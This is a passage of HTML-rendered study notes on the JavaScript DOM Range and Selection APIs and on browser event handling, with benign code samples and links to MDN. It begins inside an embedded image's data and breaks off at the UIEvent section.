UFzdfWJADfSLZmlxBCiTQ7jEOYe4vgkkwlulsq0rVpx0MUuJsDkd0aNe4dIPwmU/17m2NrYPfgBgiisyC8DzkGmaO/7z1Vhs1yRoZosOyEO654J5YyPRaF7RAQjb2jHbO/cuknzjsYHfECH+wyx7HMBBHRDIV2AGiVxM/h2BP4hmCn1EQ/T2KAhXIID///LM1JMHGg0Ayqmrftq01KERy4aPH4BP1FbVuFwc6GA3WJYw560XuGAEOsj9vlIo7h85AgAX1wFfP1J2RKvXjfXHcf7mAG86iOJF9rGNhWLhejOhpZIkCghvP/VbK08HdMQnXVKYMzptBFIZxArwLdDS3BWThggW2/swsCKBwEXm4sfu99JI9TlznIVQcV2Emo0dcx3wfn4vBIbLQQT5tijbMa3cPMEq0GdbPcKmxj5C9gMxqEXbeE+wHtEXeT+Je0rHdMSkoQLS/4DlcYbj+3DHuxiCsIxNpiRFBhD6ZNMka63a33Wbf655QlAlhfRr4Ttbuki0rMCCmvghth3bt7ACE1xhwfkOb1q3tADm4D5dZYy4GZMlgKYWtOsEBJvUkL3EAlM61pqy7Z9xv7rs7JmHkg6R737OxZ8y4ENGomId0cIPdxGhpwK2KKzhsgJUI15/ZPAFGRPRzbfFkMEhOHIhl099TkTOBDAOBZH2DWRAGHQOE+wI3W7ZCxEUPC5ZxKSy6jXpgaJ/u08cu9mMMcSPiOnTvc2H7hQ0iwPfT8HH5IJasSTKKDGtgGGVX57B0qYQ+W1iPcr8BkUeoefQdnXnQwIEp1zLShdD94HVj9uQI5pMSDSaPqcMwcK+YDeESDtuzRVtM/KxgCt5f2l9YGZei9jay1YCwdupCtCSCnUkQVhyIG+B7koFAujoz+ie4C/HDeJOoXy4MXCZQF7wwDtyI2Kso4lxrflvwviUmAm2CZHLfM7VnnKc8nqJcgheAAJ04IJDUi8AvBmUM+hkQJ1ufzgWXRCBFapxAClGUYcbAjCidhz6Iyw+2q+FNCVuGCMMJ5KVGAllEkUCK4gAjelx7QiSDNU5sWlwuO4HEf06YND5lfjyJDZ8iP6zjcG3YzMrGZ3etkj0mTIhLBTPIOM/vFZc3BCvFWeZhzyL2jsePsl/W2b+oR/DlmkITSPz4+PWDiUeoifzggki8TqTERfziAOswrMEVVGSyEKLwYE2T/svfwoK12DD7d6liKArVxSouLzZv2mSj48LC4IUQRRvEiv6bGEB0OSGBFDlDAilE8UUCKYEUOUQCKUTxRQIpgRQ5RAIpRPFFAimBFDlEAilE8UUCKYEUOUQCKUTxRQIpgRQ5RAIpRPFFAimBFDlEAilE8UUCKYEUOUQCKUTxRQIpgRQ5RAIpRPFFAimBFDlEAilE8UUCKYEUOUQCKUTxRQIpgRQ5RAIpRPFFAimBFDnECST/qob/RqKkpFR80g+rVkkgvb9CFDhOIJWUlIpvkkAKkQP4P3JhI1MlJaXik06fPu316MsPCaQQQggRggRSCCGECEECKYQQQoQggRRCCCFCkEAKIYQQIUgghRBCiBAkkEIIIUQIEkghRJHj3LlzZtnSpWbgq6+ax7p3N32fecZ8MHq02bdvn1dCiNwjgRRCFCk2/fSTadm8eehTXSqULWs+HjfOKylEbpFACiGKDDy1pUH9+vlEsWGDBqZW9er+cekrrzTfLlvmvUOI3CGBFKKEcuLECe/VBc6cOWP27NljTp486eWk5o8//gj9rCAHDx5M65Fkx44dsykMHpJdsVw5M3TIEHPE+08wZ8+eNZ9NmeKLZK8ePWy+ELlEAilECeDBLl1M7Zo1TY8nnjBfL1pkmjVpYrp07uydNWbe3Lnm1pYtTfkyZXyRad+2rVmzZo1X4rx48hkk3JjvDRtmbrrhBr/8ww8+aI4ePeqVPs8nkyaZ62rXtudxfz75+ONm/vz5/uds27rVK3meTz/5xDS66Sb/M3k9Y/p07+wFENxEEHVmj7yvdatWXq4QuUMCKUQJoF2bNlY4qlet6ovI/Z062XOTJkzwBSkxXVOlin0gNTADdPlVK1XKV86lQQMH2rIw9qOPQstUqVjRf71l82avtDF9n33Wz69UvrydJbrjd99+2ysVzdIlS/zyvXv18nKFyB0SSCFKAE4gScwc58yebbZs2WLP4cq8pUULM3PGDHP48GFz4MABM3rUKL/8h2PG2HJBgUQ4cWkinrNmzjTl82aH5Le77TZb9s8//zTV8sqQx9/Zs2aZXbt2ma8WLjQ31qvnf44TyCWLF/t5H+V9Hy5T0oTx420eM9vt27fbsmEQvXp9nTr+Z6xaudI7I0TukEAKUQJwAnlHhw5eTn4OHTpkvpgzx7ozN27caPNwgfKeZ556yh4HBXLkiBE2z3Hv3XfbfFy3sGH9er/suLFjbZ4DkXTnnEDi+uW4SaNGZvfu3fmSi1gdNXKkLZsIQk+gjvtMZqJCFAYSSCFKAE4gnVs1yPfffXeRy5RZposM7d2zpy0XFMhEsXrk4YdtvhNIxNaV/XHdOpvnWPTVV/45J5BR2zaCqU+I25TvqVyhgl+me7duaQUDCZENEkghSgDJBNJtm6h77bV2trdwwQLT88knfdHJRCBXLF/ul/1y3jyb5wgTyI63326PEeWn+/QJTaxpOggYGvjaa/7nkJg5ShxFYSKBFKIEECWQRJ06gXFrjY56deva/EwEknVMFwzE+uZ+7wk3x48ft9Gu7nOcQA7o398es5bpgoIcvCcI20ru7tjR/wzeM2XyZO+sEIWHBFKIEkCyGaRzpd51551mx44d5tSpU2buF1/4gTeZCCQEo1LZ4tG8adN820hITiDZe0ngD3l1atUyI4YPt4E9Q956y9SqUcNMmjjRlgP3W1wqW7q0qVq5cr7EbFiIXCOBFKIEkEwgJyZs8yhTqpSdPbp1yUwF8uiRI36+S0SwIn7u2EXSwuLFi/3AoMTUrWtXr5Sx3xFWJpjYJiJErpFAClECwAXJk2fYyhHGd99+a/cOEuSCgPGEGlyuvIeN/cC2C45Jq1evtnkOto2QP/7jj72cCzBLJDqWdUk28wf3R+7du9crdR6+l20eT/XubcX1jcGDbRBREL7D1SMqvf/ee15pIXKHBFIIkRE7d+60blZmkg7WIhs3bGjFkX2L/FcOIYorEkghREawVQQh5Ik4PMbu9vbt7Vqkmz3yGDohijMSSCFERmzYsOGigBoSDwOYNnWqV0qI4osEUgiRFQf277drlqxzJj6cXIjijARSCCGECEECKYQQQoQggRRCCCEuwpj/B9BDcdnF50mdAAAAAElFTkSuQmCC" alt=""> <ul><li><code>Range.selectNode(node: Node): void</code>: Sets the Range to contain the <code>Node</code> and its contents</li> <li><code>Range.selectNodeContents(node: Node): void</code>: Sets the Range to contain the contents of a <code>Node</code></li></ul></li> <li>before or after
<ul><li><code>setStartBefore(refNode)</code> — Sets the starting point of the range to begin before refNode, so refNode is the first node in the selection. The <code>startContainer</code> property is set to <code>refNode.parentNode</code>, and the <code>startOffset</code> property is set to the index of refNode within its parent’s <code>childNodes</code> collection</li> <li><code>setStartAfter(refNode)</code> — Sets the starting point of the range to begin after refNode, so refNode is not part of the selection; rather, its next sibling is the first node in the selection. The <code>startContainer</code> property is set to <code>refNode.parentNode</code> , and the <code>startOffset</code> property is set to the index of refNode within its parent’s <code>childNodes</code> collection plus one</li> <li><code>setEndBefore(refNode)</code> — Sets the ending point of the range to begin before refNode, so refNode is not part of the selection; its previous sibling is the last node in the selection. The <code>endContainer</code> property is set to <code>refNode.parentNode</code>, and the <code>endOffset</code> property is set to the index of refNode within its parent’s childNodes collection</li> <li><code>setEndAfter(refNode)</code> — Sets the ending point of the range to begin before refNode, so refNode is the last node in the selection. The <code>endContainer</code> property is set to <code>refNode.parentNode</code>, and the <code>endOffset</code> property is set to the index of refNode within its parent’s <code>childNodes</code> collection plus one</li></ul></li> <li>Complex Selection
<ul><li><code>Range.setStart(node: Node, offset: number): void</code> <ul><li>the reference node becomes the <code>startContainer</code>, and the offset becomes the <code>startOffset</code></li></ul></li> <li><code>Range.setEnd(node: Node, offset: number): void</code> <ul><li>the reference node becomes the <code>endContainer</code>, and the offset becomes the <code>endOffset</code></li></ul></li></ul></li></ul></li> <li><p>behind the scenes</p> <ul><li>When a range is created, internally it creates a document fragment node onto which all of the nodes in the selection are attached</li> <li>recognize missing opening and closing tags and are, therefore, able to reconstruct a valid DOM structure to operate on</li> <li>all nodes in the range’s internal document fragment are simply pointers to nodes in the document</li></ul></li> <li><p>Interacting with DOM Range Content</p> <ul><li><code>Range.deleteContents(): void</code>: Removes the contents of a <code>Range</code> from the <code>Document</code></li> <li><code>Range.extractContents(): DocumentFragment</code>: Moves contents of a <code>Range</code> from the document tree into a <code>DocumentFragment.</code> <ul><li>cut</li></ul></li> <li><code>Range.cloneContents(): DocumentFragment</code>: Returns a <code>DocumentFragment</code> copying the nodes of a <code>Range</code>.
<ul><li>contains clones of the nodes contained in the range instead of the actual nodes</li></ul></li> <li><code>Range.insertNode(node: Node): void</code>: Insert a <code>Node</code> at the start of a <code>Range</code></li> <li><code>Range.surroundContents(newParent: Node): void</code>: Moves content of a <code>Range</code> into a new <code>Node</code></li></ul></li> <li><p>Collapsing</p> <ul><li>When a range isn’t selecting any part of a document, it is said to be collapsed, start and end points are at the same position</li> <li><code>Range.collapsed: boolean</code>: see before</li> <li><code>Range.collapse(toStart?: boolean): void</code>: Collapses the <code>Range</code> to one of its boundary points
<ul><li><code>true</code> , then the range is collapsed to its starting point</li> <li>if it is <code>false</code>, the range is collapsed to its ending point</li> <li>defaults to <code>false</code> (experimental, IE defaults to <code>true</code>)</li></ul></li></ul></li> <li><p>Range wise Operations</p> <ul><li><code>Range.cloneRange(): Range</code>: creates an exact duplicate</li> <li><code>Range.compareBoundaryPoints(how: number, sourceRange: Range): number</code>: compare
<ul><li>how
<ul><li><code>Range.START_TO_START</code> (0) — Compares the starting point of the fi rst range to the starting point of the second</li> <li><code>Range.START_TO_END</code> (1) — Compares the starting point of the fi rst range to the end point of the second</li> <li><code>Range.END_TO_END</code> (2) — Compares the end point of the fi rst range to the end point of the second</li> <li><code>Range.END_TO_START</code> (3) — Compares the end point of the fi rst range to the starting point of the second</li></ul></li> <li>returns <code>–1</code> if the point from the range comes before the point from the sourceRange range, <code>0</code> if the points are equal, or <code>1</code> if the point from the first range comes after the point from the second range</li></ul></li> <li><code>Range.detach(): void</code> <ul><li>Releases the <code>Range</code> from use to improve performance</li> <li>no-op in modern browsers</li></ul></li></ul></li> <li><p>WD methods or non-IE methods (3+3)</p> <ul><li><code>Range.createContextualFragment(fragment: string): DocumentFragment</code> <ul><li>Returns a <code>DocumentFragment</code> created from a given string of code</li></ul></li> <li><code>Range.getBoundingClientRect(): DOMRect</code> <ul><li>Returns a <code>DOMRect</code> object which bounds the entire contents of the <code>Range</code>; this would be the union of all the rectangles returned by <code>Range.getClientRects()</code></li></ul></li> <li><code>Range.getClientRects(): DOMRect</code> <ul><li>Returns a list of DOMRect objects that aggregates the results of <code>Element.getClientRects()</code> for all the elements in the <code>Range</code></li></ul></li> <li><code>Range.intersectsNode(node: Node): boolean</code> <ul><li>Returns a <code>Boolean</code> indicating whether the given node intersects the <code>Range</code></li></ul></li> <li><code>Range.isPointInRange(node: Node, offset: number): boolean</code> <ul><li>Returns a <code>Boolean</code> indicating whether the given point is in the <code>Range</code></li></ul></li> <li><code>Range.comparePoint(referenceNode: Node, offset: number): number</code> <ul><li>returns <code>-1</code>, <code>0</code>, or <code>1</code> depending on whether the referenceNode is before, the same as, or after the <code>Range</code></li></ul></li></ul></li> <li><p>Ranges in IE8 and earlier: P424</p></li></ol> <h3 id="new-bom-and-dom-related"><a href="#new-bom-and-dom-related" class="header-anchor">#</a> New BOM and DOM Related</h3> <ol><li><p><code>window.getSelection(): Selection</code></p> <ul><li>represents the range of text selected by the user or the current position of the caret</li> <li>selected text: <code>Selection.toString()</code></li> <li>properties of <code>Selection</code> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Selection#Properties" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li>methods of <code>Selection</code> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Selection#Methods" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li> <li><p><code>Document.execCommand(commandId: string, showUI?: boolean, value?: any): boolean</code></p> <ul><li>commandId
<ul><li>for editing, like <code>undo</code>, <code>redo</code>, <code>bold</code>, <code>italic</code></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand#Commands" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>Document.queryCommandEnabled(commandId: string): boolean</code></li></ul></li></ul></li></ol> <h2 id="events"><a href="#events" class="header-anchor">#</a> Events</h2> <ol><li><p>Event Flow</p> <ul><li>Event Bubbling
<ul><li>an event is said to start at the most specific element (the deepest possible point in the document tree) and then flow upward toward the least specific node (the document)</li> <li>IE9 bubbling up to the <code>window</code> object</li></ul></li> <li>Event Capturing
<ul><li>the least specific node should receive the event first and the most specific node should receive the event last</li> <li>begin event capturing at the <code>window</code>-level event</li> <li>not IE8 and earlier</li></ul></li> <li>phases
<ul><li>the event capturing phase</li> <li>at the target</li> <li>the event bubbling phase</li></ul></li></ul></li> <li><p><code>EventTarget</code></p> <ul><li><code>Element</code>, <code>document</code>, and <code>window</code> are the most common event targets</li> <li>other objects can be event targets too, for example <code>XMLHttpRequest</code>, <code>AudioNode</code>, <code>AudioContext</code></li></ul></li></ol> <h3 id="event-handlers"><a href="#event-handlers" class="header-anchor">#</a> Event Handlers</h3> <ol><li><p>Event Handlers for HTML and DOM Level 0</p> <ul><li>an event handler (or an event listener): with <code>on</code>- prefix compared to events</li> <li>remove: setting the value of the event handler property to <code>null</code></li></ul></li> <li><p>HTML Event Handlers</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- outputs &quot;Click Me&quot; --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>button<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Click Me<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- outputs &quot;Click Me&quot; --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>button<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Click Me<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>assigned using an HTML attribute with the name of the event handler</li> <li>The value of the attribute should be some JavaScript code to execute</li> <li>Code executing as an event handler has access to everything in the global scope</li> <li>disadvantages
<ul><li>possible that the HTML element appears on the page and is interacted with by the user before the event handler code is ready
<ul><li>enclosed in <code>try-catch</code> blocks</li></ul></li> <li>the scope chain augmentation in the event handler function can lead to different results in different browsers</li> <li>tightly couples the HTML to the JavaScript</li></ul></li> <li>behind the scenes<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">with</span> <span class="token punctuation">(</span>document<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">with</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//attribute value</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li>a function is created that wraps the <code>attribute</code> value. That function has a special local variable called <code>event</code>, which is the event object</li> <li>The <code>this</code> value inside of the function is equivalent to the event’s target element</li> <li>Within the function, members of both <code>document</code> and the element itself can be accessed as if they were local variables</li> <li>If the element is a form input element, then the scope chain also contains an entry for the parent form element<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">with</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">//attribute value</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li></ul></li> <li><p>DOM Level 0 Event Handlers</p> <ul><li>assign a function to an event handler property</li> <li>Event handlers added in this way are intended for the bubbling phase of the event flow</li></ul></li> <li><p>DOM Level 2 Event Handlers</p> <ul><li>allows adding more than a single handler for an event, works on any DOM element, not just HTML elements
<ul><li>first added first dispatched</li></ul></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#Syntax#The_value_of_this_within_the_handler" target="_blank" rel="noopener noreferrer">specify <code>this</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>EventTarget.addEventListener(type, listener: (this, ev) =&gt; any, options?: boolean | AddEventListenerOptions): void</code> <ul><li>duplicate instances are discarded if multiple identical listeners are registered</li> <li>overload: <code>listener: EventListenerOrEventListenerObject</code> <ul><li>whose <code>handleEvent(event): void</code> method serves as the callback function</li></ul></li> <li>options: boolean
<ul><li>call the event handler during the capture phase (<code>true</code>) or during the bubble phase (<code>false</code>)</li> <li>default <code>false</code></li></ul></li> <li>options: AddEventListenerOptions
<ul><li>no IE</li> <li>default <code>false</code> for all properties</li> <li><code>capture</code>: A <code>Boolean</code></li> <li><code>once</code>: A <code>Boolean</code>. If true, the <code>listener</code> would be automatically removed when invoked</li> <li><code>passive</code>: A <code>Boolean</code> which, if <code>true</code>, indicates that the function specified by <code>listener</code> will never call <code>preventDefault()</code>. If a passive <code>listener</code> does call <code>preventDefault()</code>, the user agent will do nothing other than generate a console warning</li></ul></li></ul></li> <li><code>EventTarget.removeEventListener(): void</code> — same arguments
<ul><li>no <code>once</code> property if <code>AddEventListenerOptions</code> used</li> <li>Event handlers added via <code>addEventListener()</code> can be removed only by using <code>removeEventListener()</code> and passing in the same arguments
<ul><li>which means anonymous functions added cannot be removed</li> <li>with <code>AddEventListenerOptions</code>, Only the <code>capture</code> setting matters, but it's probably wise to use the same values used</li></ul></li> <li>arguments that do not identify any currently registered <code>EventListener</code> has no effect</li></ul></li></ul></li> <li><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#Improving_scrolling_performance_with_passive_listeners#Legacy_Internet_Explorer_and_attachEvent" target="_blank" rel="noopener noreferrer">Internet Explorer Event Handlers<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ul><li>the event handler runs in the global context, so <code>this</code> is equivalent to <code>window</code></li> <li>the event handlers fire in reverse of the order they were added</li></ul></li> <li><p>Cross-Browser Event Handlers</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#Syntax#Compatibility" target="_blank" rel="noopener noreferrer">IE8 polyfill<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>in the book: P449</li></ul></li></ol> <h3 id="the-event-object"><a href="#the-event-object" class="header-anchor">#</a> The Event Object</h3> <ol><li><p><code>Event</code></p> <ul><li>not IE8 and earlier</li> <li>When an event related to the DOM is fired, all of the relevant information is gathered and stored on an object</li> <li>In DOM-compliant browsers, the <code>event</code> object is passed in as the sole argument to an event handler<div class="language-javascript extra-class"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div>once all event handlers have been executed, the <code>event</code> object is destroyed</li> <li>constructor: <code>Event(typeArg: DOMString, eventInitDict?: EventInit)</code></li> <li>properties: read only
<ul><li><code>Event.bubbles</code> Read only — A Boolean indicating whether the event bubbles up through the DOM or not</li> <li><code>Event.cancelable</code> Read only — A Boolean indicating whether the event is cancelable.</li> <li><code>Event.currentTarget</code> Read only — A reference to the currently registered target for the event. This is the object to which the event is currently slated to be sent; it's possible this has been changed along the way through retargeting.</li> <li><code>Event.defaultPrevented</code> Read only — Indicates whether or not <code>event.preventDefault()</code> has been called on the event.</li> <li><code>Event.eventPhase</code> Read only — Indicates which phase of the event flow is being processed.
<ul><li><code>Event.NONE</code> 0</li> <li><code>Event.CAPTURING_PHASE</code> 1</li> <li><code>Event.AT_TARGET</code> 2</li> <li><code>Event.BUBBLING_PHASE</code> 3</li></ul></li> <li><code>Event.target</code> Read only — A reference to the target to which the event was originally dispatched.</li> <li><code>Event.timeStamp</code> Read only — The time at which the event was created (in milliseconds). By specification, this value is time since epoch, but in reality browsers' definitions vary; in addition, work is underway to change this to be a <code>DOMHighResTimeStamp</code> instead.</li> <li><code>Event.type</code> Read only — The name of the event (case-insensitive).</li> <li><code>Event.isTrusted</code> Read only — Indicates whether or not the event was initiated by the browser (after a user click for instance) or by a script</li></ul></li> <li>methods
<ul><li><code>Event.composedPath()</code>, (non-standard) <code>Event.deepPath()</code></li> <li><code>Event.preventDefault()</code> <ul><li>prevent the default action of a particular event</li> <li>Any event that can be canceled using <code>preventDefault()</code> will have its cancelable property set to <code>true</code></li> <li>for example, the default behavior of a link is to navigate to the URL specified</li></ul></li> <li><code>Event.stopPropagation()</code> <ul><li>Prevents further propagation of the current event in the capturing and bubbling phases</li> <li>coordination: <code>Event.eventPhase</code></li></ul></li></ul></li></ul></li> <li><p>Event Object for IE</p> <ul><li>P447</li> <li>polyfill: P449</li></ul></li> <li><p>Creating and triggering events</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> event <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Event</span><span class="token punctuation">(</span><span class="token string">'build'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Listen for the event.</span>
elem<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Dispatch the event.</span>
elem<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Creating_and_triggering_events" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol> <h3 id="event-types"><a href="#event-types" class="header-anchor">#</a> Event Types</h3> <ol><li><p>list on <a href="https://developer.mozilla.org/en-US/docs/Web/Events" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li> <li><p>all inherit <code>Event</code></p></li></ol> <h4 id="ui-events"><a href="#ui-events" class="header-anchor">#</a> UI Events</h4> <ol><li><p><code>UIEvent</code></p> <ul><li>constructor: <code>UIEvent(typeArg: DOMString, eventInitDict?: UIEventInit)</code></li> <li>properties
<ul><li><code>UIEvent.detail</code> read only
